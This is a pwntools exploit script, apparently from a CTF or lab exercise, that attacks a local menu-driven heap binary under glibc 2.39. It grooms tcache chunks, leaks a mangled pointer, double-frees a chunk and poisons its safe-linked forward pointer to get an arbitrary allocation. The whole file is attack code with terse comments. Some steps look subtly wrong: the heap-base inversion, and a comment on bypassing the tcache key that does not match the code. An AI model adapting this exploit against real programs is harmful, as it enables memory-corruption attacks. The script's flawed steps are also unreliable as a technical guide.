#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')                                # glibc 2.39
io = process(elf.path)

def alloc(idx, sz, data=b''):                            # ❶ menu wrappers
    io.sendlineafter(b'> ', b'1'); io.sendlineafter(b'idx: ', str(idx).encode())
    io.sendlineafter(b'sz: ', str(sz).encode()); io.sendafter(b'data: ', data)

def free(idx):
    io.sendlineafter(b'> ', b'2'); io.sendlineafter(b'idx: ', str(idx).encode())

def show(idx):
    io.sendlineafter(b'> ', b'3'); io.sendlineafter(b'idx: ', str(idx).encode())
    return io.recvline().strip()

# 1) Groom two 0x30 chunks; free B first so the tcache head is B->something.
alloc(0, 0x28, b'A' * 8)                                 # A
alloc(1, 0x28, b'B' * 8)                                 # B
alloc(2, 0x28, b'guard')                                 # prevent top-chunk coalesce
free(1)                                                  # B on tcache[0x30]
free(0)                                                  # A on tcache[0x30], head=A
leak = u64(show(0).ljust(8, b'\x00'))                    # ❷ mangled fd of A -> B
heap_base = (leak << 12) & ~0xfff                        # ❸ invert (L>>12) XOR
log.success('heap base: %#x', heap_base)

# 2) Classic tcache double-free: put A on the list twice.
free(1)                                                  # tcache_key bypassed:
                                                         #   B key was cleared on alloc 1
free(0)                                                  # ❹ A now on list twice

# 3) Poison A's fd to point at our chosen aligned target.
target = heap_base + 0x2f0                               # ❺ some aligned addr in heap
L      = heap_base + 0x2a0                               # A's user-data address
poison = (L >> 12) ^ target                              # ❻ safe-linking mangle
alloc(3, 0x28, p64(poison))                              # overwrites A's fd
alloc(4, 0x28, b'x' * 8)                                 # first pop = A again
alloc(5, 0x28, b'PWNED_HERE')                            # ❼ this alloc == target

io.interactive()
